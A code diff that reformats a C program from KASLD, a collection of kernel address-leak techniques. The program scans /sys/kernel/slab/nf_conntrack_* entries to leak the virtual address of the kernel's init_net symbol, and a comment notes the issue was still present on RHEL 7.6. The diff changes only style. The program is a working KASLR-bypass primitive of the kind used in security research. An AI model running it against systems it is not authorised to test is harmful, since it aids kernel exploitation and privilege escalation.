@@ -1,15 +1,20 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
-// Retrieve init_net kernel symbol virtual address from /sys/kernel/slab/nf_conntrack_*
-// Patched some time around 2016, but still present in RHEL 7.6 as of 2018
-// - https://www.openwall.com/lists/kernel-hardening/2017/10/05/5
+//
+// Retrieve init_net kernel symbol virtual address from
+// /sys/kernel/slab/nf_conntrack_*
+//
+// Patched some time around 2016, but still present in RHEL 7.6 as of 2018.
+//
+// References:
+// https://www.openwall.com/lists/kernel-hardening/2017/10/05/5
 // ---
 // <bcoles@gmail.com>
 
 #define _GNU_SOURCE
-#include <dirent.h> 
-#include <string.h>
-#include <stdio.h> 
+#include <dirent.h>
+#include <stdio.h>
 #include <stdlib.h>
+#include <string.h>
 #include <sys/utsname.h>
 
 // https://www.kernel.org/doc/Documentation/x86/x86_64/mm.txt
@@ -28,14 +33,14 @@ struct utsname get_kernel_version() {
 unsigned long get_kernel_addr_conntrack() {
   unsigned long addr = 0;
   struct dirent *dir;
-  const char* path = "/sys/kernel/slab/";
-  const char* needle = "nf_conntrack_";
+  const char *path = "/sys/kernel/slab/";
+  const char *needle = "nf_conntrack_";
   const int addr_len = 16; /* 64-bit */
   char d_path[256];
 
   printf("[.] trying %s ...\n", path);
 
-  DIR* d = opendir(path);
+  DIR *d = opendir(path);
 
   if (d == NULL) {
     printf("opendir(%s): %m\n", path);
@@ -48,7 +53,8 @@ unsigned long get_kernel_addr_conntrack() {
 
     snprintf(d_path, sizeof(d_path), "%s", dir->d_name);
 
-    char* substr = (char*)memmem(d_path, sizeof(d_path), needle, strlen(needle));
+    char *substr =
+        (char *)memmem(d_path, sizeof(d_path), needle, strlen(needle));
 
     if (substr == NULL)
       continue;
@@ -72,7 +78,7 @@ unsigned long get_kernel_addr_conntrack() {
   return addr;
 }
 
-int main (int argc, char **argv) {
+int main(int argc, char **argv) {
   struct utsname u = get_kernel_version();
 
   if (strstr(u.machine, "64") == NULL) {
@@ -81,7 +87,8 @@ int main (int argc, char **argv) {
   }
 
   unsigned long addr = get_kernel_addr_conntrack();
-  if (!addr) return 1;
+  if (!addr)
+    return 1;
 
   printf("leaked init_net: %lx\n", addr);
 
